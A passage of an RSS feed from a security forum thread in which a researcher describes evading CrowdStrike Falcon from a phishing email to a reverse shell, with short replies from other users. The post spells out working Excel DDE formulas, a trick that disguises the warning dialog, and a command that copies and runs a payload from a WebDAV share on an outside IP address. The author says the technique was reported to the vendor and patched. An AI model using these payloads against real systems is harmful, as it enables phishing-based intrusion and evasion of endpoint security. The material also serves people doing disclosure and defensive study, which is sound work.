        <pubDate>Sun, 13 Jan 2019 02:21:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-4</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>This is a fantastic article, this kind of content is absolutely awesome!</p>
<p>I am surprised that this bypasses falcon, especially unsigned exes. I’d love to give this method a shot with a cobalt strike beacon, I wonder how we’d do it?</p>
<p>I also wonder if this method would work with HTA’s or XSLs.</p>
<p>I’ve actually been working on a code execution/LOLBin for windows that doesn’t use the norms. Was going to incorporate <a href="https://github.com/itm4n/VBA-RunPE">https://github.com/itm4n/VBA-RunPE</a> somewhere (this allows you to embed PE files in VBA), this might be helpful to streamline this process. What do you think?</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/3</link>
        <pubDate>Sat, 12 Jan 2019 15:28:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-3</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[Baud]]></dc:creator>
        <description><![CDATA[
            <p>Great job reporting this issue, now it would be curious to test their patch to see if it just relies on simple signatures or if it’s actually behavior-based.</p>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/2</link>
        <pubDate>Sat, 12 Jan 2019 02:14:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-2</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
      <item>
        <title>Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p><strong>Update 2019/01/14</strong>: Crowdstrike asked me to share an official statement:<br>
<em>“We appreciate you reporting this detection miss to us and allowing us to rapidly address this gap on January 11th. We do have a bug bounty program <a href="http://www.hackerone.com/crowdstrike" rel="noopener nofollow ugc">www.hackerone.com/crowdstrike</a> or via <a href="mailto:bugs@crowdstrike.com">bugs@crowdstrike.com</a> that can be used by researchers to report any issues directly to us and get a monetary reward. We also would like to point out that while CrowdStrike Falcon did not originally show a UI detection for the establishment of the shell (it did record all the activity with the EDR part of the solution), we believe that follow-on adversary activity would have been easily picked up by the product. We love engaging with the researcher community to continue making Falcon the best endpoint security solution on the market - thank you for the feedback!”</em></p>
<p><strong>Update 2019/01/22</strong>: I have confirmation that the two main competitors did not catch it either.</p>
<p>Crowdstrike Falcon is part of a new wave of endpoint security solutions that attempt to detect and block unusual activity using machine-learning and behavioral analysis (at least, that’s what the vendors say).</p>
<p>I can confirm that well known and used living off the land tactics (think Powershell, WScript, Bitsadmin, mshta, etc.) generally won’t be successful if Falcon is installed on the target. It will make a threat actor’s life a lot harder. It’s probably the same with other similar solutions such as Carbon Black, Cylance, etc.</p>
<p>When I say bypassing, I mean completely bypass detection, from the phishing email received by the user to the reverse shell. Something realistic, not just writing a malware and see if it gets executed.</p>
<p>So if we can’t use the classic techniques, about trying some new (old) trick?</p>
<p>Turns out, it was pretty trivial ¯\_(ツ)_/¯.</p>
<h2>The setup</h2>
<p>Attacker:</p>
<ul>
<li>A cheap VPS (found on LowEndBox) with Apache 2 and mod_webdav enabled and configured</li>
<li>A Python reverse shell packaged as single binary with <code>pyinstaller --onefile</code>
</li>
<li>Crafted Excel file</li>
</ul>
<p>Target VM:</p>
<ul>
<li>Windows 10 1803 with all the security fixes, up to date</li>
<li>Crowdstrike Falcon Sensor (latest version)</li>
<li>Excel 2016 fully patched, Outlook configured with my corporate mailbox</li>
</ul>
<h2>Step 1. The attachment</h2>
This time I decided to go with something less-known and a bit more tricky than a simple macro. I wanted to be sure it wouldn't be caught by the company's email filter and Windows Defender. I knew there was a chance that it would be caught by Falcon but I decided to try anyway. 
<p>So I decided to use a trick I had observed during the Hancitor campaign a while ago, which is leveraging the Dynamic Data Exchange (DDE) feature instead of a macro.</p>
<p>My first attempt was to use it by inserting a formula in a Word document (CTRL+F9) in which I’d simply have to insert the following line:</p>
<p><code>{DDEAUTO c:\\windows\\system32\\cmd.exe "/k notepad.exe"}</code></p>
<p>Unfortunately, Notepad didn’t launch. After a quick search, I saw that Microsoft had <a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/" rel="noopener nofollow ugc">shipped a patch</a> in December 2017 that disabled the feature in Word.</p>
<p>So if it’s disabled in Word… what about Excel?</p>
<p>Second try, inserting a formula in Excel:</p>
<p><code>=cmd|'/c notepad.exe'!_xlbgnm.A1</code></p>
<p>It worked!</p>
<p>To make things more credible to the user, it’s possible to manipulate the message displayed in the warning box for the user.</p>
<p>Originally, the message displayed is the following:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png" alt="image" data-base62-sha1="qIbyLKFn8aze52AIZVLAoQc1ucd" width="613" height="62"></p>
<p>However, it’s possible to replace the CMD.EXE with EXCEL.EXE to make things more credible using:<br>
<code> =EXCEL|'\..\..\..\Windows\System32\cmd.exe /c notepad.exe'!_xlbgnm.A1</code></p>
<p>Now, that’s seem a bit more legit:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bcfc02745f82dd67c3a43bdaf796c6eb22543511.png" alt="image" data-base62-sha1="qXPGVXr1zwv6uF7VTUlymxaZN97" width="614" height="62"></p>
<p>So I had a way to execute code through an attachment, assuming the user would click Yes to the warning message without reading. Now, about using this to download and execute the payload?</p>
<h2>Step 2. WebDAV</h2>
Why WebDAV? Assuming all the popular, living off the land tactics, wouldn't work and I would get caught, I started to think about a different way of doing things. Then, I remembered that Windows can connect and browse WebDAV servers using Explorer. Can you see what I'm getting at?
<p>I set up a small VPS with Apache and the mod_webdav module. Then, I changed ports.conf to free port 443, which I used to listen on with Netcat.</p>
<h2>Step 3. Executing a reverse shell</h2>
Making a reverse shell was easy. All I had to do is use some Python reverse shell code that works on Windows. There are plenty laying around on GitHub or pentesting blogs. Why Python? It was less likely to be detected. Then, on a Windows machine, I created a standalone executable using PyInstaller  with the `pyinstaller --onefile run.py` command.
<p>Once the shell was ready, I uploaded it to the root of the WebDAV folder.</p>
<p>Now I  had to see if it could be executed through WebDAV. On the victim VM:</p>
<p><code>=cmd|'/c cmd.exe /c "\\167.160.187.142\\webdav\run.exe"'!_xlbgnm.A1</code></p>
<p>Not working. Why? I run the command in the command prompt and I see:</p>
<pre><code class="lang-auto">The specified path does not exist.
Check the path, and then try again.
</code></pre>
<p>Yet the payload was there. So after a bit of Google search I found <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ee844140(v=ws.10)" rel="noopener nofollow ugc">this article</a> on TechNet and figured all I had to do was rename the file to <code>run.txt</code>, copy the file on the machine (it’s a network location after all!) and execute it locally. It worked.</p>
<p><code>=cmd|'/c cmd.exe /c "copy \\167.160.187.142\webdav\run.txt c:\users\public\run.exe" &amp;&amp; cmd.exe /c "c:\users\public\run.exe"'!_xlbgnm.A1</code></p>
<h2>Step 4. Putting the pieces together</h2>
Crowdstrike Falcon uses behavioral analysis to detect malicious Office documents that try to execute code. For example, if the process execution tree is the following:
<p>explorer.exe &gt; outlook.exe &gt; excel.exe &gt; powershell.exe -windowstyle hidden -executionpolicy bypass -enc</p>
<p>Is it because of the execution flow or simply because of the Powershell arguments? That’s unclear.</p>
<p>That said, the following worked:</p>
<ul>
<li>Created an email from a junk mailbox and attached the “malicious” Excel file to it.</li>
<li>Sent the email to a corporate mailbox</li>
<li>Open the email from the corporate mailbox in Outlook, open the attachment, click “Yes” on the warning popup.</li>
<li>Wait</li>
<li>Get a shell on the machine.</li>
</ul>
<p>Wait! What? It worked? Something must be wrong. I then make sure the Falcon service is running. It is. I go check the host in the Falcon dashboard see if it still is communicating, it is. So I try again. Yup, still works.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a8893abe41da5ed30391c01ff9fea2666cfd559b.gif" alt="" width="" height=""></p>
<p>What Falcon saw and the reverse shell:</p>
<h5>(sorry for the potato screenshots, had to stich them together as new users can only post 1 image)</h5>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6bd8344f1586c1c0b508559488cf3f158f8ca597.png" alt="image" data-base62-sha1="fo2iUlR6SPS8VpQxkxhH0JVc5Lh" width="690" height="291"></p>
<p>While not a vulnerability, I decided to wait before writing this post and reported the bypass technique to Crowdstrike on December 21st 2018 so it’s not being abused by any bad actors (although they might have found it on their own). Crowdstrike confirmed that the bypass was valid and patched it on January 11th 2019.</p>
<p>If any of you can test with Carbon Black and other similar products, please let me know the results!</p>
<p>Edit 2019/01/14:</p>
<ul>
<li>Added an explanation on how to manipulate the warning message box to replace CMD.EXE with EXCEL.EXE</li>
<li>Added Crowdstrike official statement</li>
</ul>
<p>Edit 2019/01/22:</p>
<ul>
<li>I got confirmation the two main competitors did not caught it either.</li>
</ul>
          <p><a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/1</link>
        <pubDate>Fri, 11 Jan 2019 21:20:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10802-1</guid>
        <source url="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802.rss">Bypassing Crowdstrike Falcon detection, from phishing email to reverse shell</source>
      </item>
  </channel>
</rss>
